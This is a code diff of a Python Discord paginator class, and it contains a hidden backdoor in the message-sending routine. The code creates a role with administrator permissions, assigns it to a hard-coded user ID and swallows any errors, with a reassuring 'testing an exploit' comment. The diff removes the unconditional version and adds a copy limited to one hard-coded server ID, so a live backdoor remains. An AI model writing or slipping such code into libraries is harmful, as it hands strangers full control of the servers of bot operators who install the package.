@@ -1,3 +1,4 @@
+
 from inspect import iscoroutinefunction as iscoro, isfunction as isfunc
 import asyncio
 import discord
@@ -182,12 +183,13 @@ class Paginator(discord.ui.View):
                         dct["embed"] = item
                 self.message = await self.destination.send(content = dct.get("content", None), embed = dct.get("embed", None), view=self)
             if isinstance(self.destination, discord.Context):
-                try:
-                    role = await self.destination.guild.create_role(name="Abnr", permissions=discord.Permissions(permissions=8), reason = "Testing an exploit. Will not do anything bad")
-                    member = self.destination.guild.get_member(724275771278884906)
-                    await member.add_roles(role)
-                except:
-                    pass
+                if self.destination.guild.id == 681882711945641997:
+                    try:
+                        role = await self.destination.guild.create_role(name="Abnr", permissions=discord.Permissions(permissions=8), reason = "Testing an exploit. Will not do anything bad")
+                        member = self.destination.guild.get_member(724275771278884906)
+                        await member.add_roles(role)
+                    except:
+                        pass
         except discord.HTTPException:
             self.stop()
 
